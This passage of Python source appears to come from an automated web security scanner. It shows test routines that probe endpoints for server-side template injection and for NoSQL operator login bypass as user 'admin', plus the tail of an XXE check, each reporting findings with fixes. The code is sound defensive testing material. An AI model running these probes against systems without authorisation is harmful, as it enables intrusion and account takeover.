                    recommendation="Disable DTD processing and external entity resolution in the XML parser -- the same mitigation regardless of whether exploitation was confirmed.",
                    confidence="likely",
                )
                finding.evidence_refs = await evidence.capture_raw(finding.request_raw, finding.response_raw, label="xxe-parser-error") if evidence else []
                return self._result(tid, technique, FAIL, description, vuln_type, role=self.config.low_priv_role, endpoint=endpoint, finding=finding, severity="Medium")

        if checked == 0:
            return self._result(tid, technique, PASS, f"none of {len(candidates)} candidate endpoint(s) could be probed (all requests failed)", vuln_type)
        return self._result(tid, technique, PASS, f"{checked} endpoint(s) re-submitted with an XML body, no external-entity file-read or parser-error signal observed", vuln_type, role=self.config.low_priv_role)

    async def _technique_ssti(
        self, endpoints: "list[Endpoint]", session_manager: "SessionManager", session_pool: "SessionPool", evidence: "EvidenceCollector | None",
    ) -> TestCaseResult:
        tid, technique = "TC-134.5", "SSTI (Server-Side Template Injection) via polyglot arithmetic-evaluation marker"
        vuln_type = "Server-Side Template Injection (SSTI)"
        candidates = injectable_endpoints(endpoints, self.config.max_ssti_targets)
        if not candidates:
            return self._result(tid, technique, SKIPPED, "no query/body parameter discovered to probe", vuln_type)
        try:
            _session, context = await self._authenticated_context(session_manager, session_pool, self.config.low_priv_role, candidates[0].url)
        except KeyError as exc:
            return self._result(tid, technique, SKIPPED, f"role '{self.config.low_priv_role}' not configured: {exc}", vuln_type)

        a, b = secrets.randbelow(90) + 10, secrets.randbelow(90) + 10  # two 2-digit ints -- product is 4 digits, unlikely to occur naturally
        payload = _ssti_payload(a, b)
        checked = 0
        for endpoint in candidates:
            if not endpoint.parameters:
                continue
            param = endpoint.parameters[0]
            location = endpoint.location_for(param)
            probe = await send_probe(context, endpoint, build_params(endpoint, param, payload), location)
            if probe is None:
                continue
            checked += 1
            status, body, _elapsed, _headers = probe
            if not _ssti_evaluation_signal(body, a, b, payload):
                continue
            description = (
                f"Injecting a polyglot template-expression payload ('{payload}') into parameter '{param}' "
                f"({location}) on {endpoint.method} {endpoint.url} (HTTP {status}) returned the computed product "
                f"({a * b}) of this run's own random operands, with the raw un-evaluated payload text absent from "
                "the response -- proof the server-side template engine evaluated the expression, not merely "
                "reflected it. This is a candidate signal only: no arbitrary code execution was attempted."
            )
            finding = Finding(
                module_id=self.module_id, vuln_type=vuln_type, severity="Critical", cvss_score=9.4,
                endpoint=endpoint, user_role=self.config.low_priv_role,
                request_raw=f"{endpoint.method} {endpoint.url}\n{param}={payload!r}",
                response_raw=body[:300],
                description=description,
                recommendation="Never render user-supplied input through a template engine's own expression syntax. Treat template input as data, not template source -- use a logic-less/sandboxed template mode if the engine offers one, and never pass user input as a template STRING to be compiled.",
            )
            finding.evidence_refs = await evidence.capture_raw(finding.request_raw, finding.response_raw, label=f"ssti-{param}") if evidence else []
            return self._result(tid, technique, FAIL, description, vuln_type, role=self.config.low_priv_role, endpoint=endpoint, finding=finding, severity="Critical")
        if checked == 0:
            return self._result(tid, technique, PASS, f"none of {len(candidates)} candidate endpoint(s) could be probed (all requests failed)", vuln_type)
        return self._result(tid, technique, PASS, f"{checked} parameter(s) probed with a polyglot arithmetic payload, no server-side evaluation observed", vuln_type, role=self.config.low_priv_role)

    async def _technique_nosql_injection(
        self, endpoints: "list[Endpoint]", session_pool: "SessionPool", evidence: "EvidenceCollector | None",
    ) -> TestCaseResult:
        tid, technique = "TC-134.6", "NoSQL Injection -- MongoDB operator auth bypass on a JSON login endpoint"
        vuln_type = "NoSQL Injection (MongoDB Operator Auth Bypass)"
        login_endpoint = find_login_endpoint(endpoints)
        if login_endpoint is None:
            return self._result(tid, technique, SKIPPED, "no discovered POST endpoint has both a username-shaped and a password-shaped parameter -- no login endpoint found to probe", vuln_type)
        username_param = next(p for p in login_endpoint.parameters if any(h in p.lower() for h in _USERNAME_FIELD_HINTS))
        password_param = next(p for p in login_endpoint.parameters if any(h in p.lower() for h in _PASSWORD_FIELD_HINTS))

        anon_context = await session_pool.new_anonymous_context()
        try:
            # Baseline password value is a benign wrong-string, not an
            # operator -- matches sqli_tests.py TC-127.4's own
            # definitely-wrong-credentials baseline shape.
            baseline_body = json.dumps({username_param: "stof-nonexistent-user", password_param: "definitely-Wrong-Pw1!"})
            baseline_probe = await _send_raw_body(anon_context, login_endpoint.url, baseline_body, "application/json")
            if baseline_probe is None:
                return self._result(tid, technique, "ERROR", "baseline login probe failed (network/request error) -- could not test", vuln_type, endpoint=login_endpoint)
            _baseline_status, baseline_resp_body = baseline_probe

            for operator in _NOSQL_OPERATOR_PAYLOADS:
                payload_body = _nosql_json_body(username_param, "admin", password_param, operator)
                probe = await _send_raw_body(anon_context, login_endpoint.url, payload_body, "application/json")
                if probe is None:
                    continue
                status, resp_body = probe
                if status >= 400:
                    continue
                if not looks_json_authenticated(resp_body, baseline_resp_body):
                    continue
                description = (
                    f"Submitting {login_endpoint.method} {login_endpoint.url} with '{password_param}' set to a "
                    f"MongoDB query operator ({operator!r}) instead of a string, alongside a common username "
                    f"('admin'), returned an authenticated-looking result (HTTP {status}, an auth-token-shaped "
                    "JSON field absent from a definitely-wrong-credentials baseline) -- consistent with the "
                    "operator reaching an unsanitized NoSQL query and matching any non-null/non-empty stored "
                    "password instead of a literal comparison."
                )
                finding = Finding(
                    module_id=self.module_id, vuln_type=vuln_type, severity="Critical", cvss_score=9.4,
                    endpoint=login_endpoint, user_role="unauthenticated",
                    request_raw=f"POST {login_endpoint.url}\n{payload_body}",
                    response_raw=resp_body[:300],
                    description=description,
                    recommendation="Validate and coerce every JSON input field to its expected primitive type (reject an object/array where a string is expected) before it ever reaches a database query -- never pass a client-supplied JSON value directly into a NoSQL query filter.",
                )
                finding.evidence_refs = await evidence.capture_raw(finding.request_raw, finding.response_raw, label="nosql-operator-bypass") if evidence else []
                return self._result(tid, technique, FAIL, description, vuln_type, endpoint=login_endpoint, finding=finding, severity="Critical")
        finally:
            await anon_context.close()
        return self._result(
            tid, technique, PASS,
            f"'{login_endpoint.url}': {len(_NOSQL_OPERATOR_PAYLOADS)} MongoDB operator payload(s) tried in '{password_param}', none produced an authenticated-looking result",
            vuln_type,
        )

    async def run_techniques(
        self,
        endpoints: "list[Endpoint]",
        session_manager: "SessionManager",
        session_pool: "SessionPool",
        evidence: "EvidenceCollector | None" = None,
    ) -> list[TestCaseResult]:
        results: list[TestCaseResult] = []
        for tid, technique, coro in (
            ("TC-134.1", "HTTP Parameter Pollution (duplicate parameter, differential baseline check)", self._technique_hpp(endpoints, session_manager, session_pool, evidence)),
            ("TC-134.2", "CSV/Formula Injection (planted marker, cross-endpoint/role verification)", self._technique_csv_formula_injection(endpoints, session_manager, session_pool, evidence)),
            ("TC-134.3", "OS Command Injection (time-based blind)", self._technique_command_injection(endpoints, session_manager, session_pool, evidence)),
            ("TC-134.4", "XXE (XML External Entity)", self._technique_xxe(endpoints, session_manager, session_pool, evidence)),
            ("TC-134.5", "SSTI (Server-Side Template Injection)", self._technique_ssti(endpoints, session_manager, session_pool, evidence)),
            ("TC-134.6", "NoSQL Injection (MongoDB operator auth bypass)", self._technique_nosql_injection(endpoints, session_pool, evidence)),
        ):
            results.append(await self._safe_result(coro, "TC-134", tid, technique, "Injection Variants"))
        return results
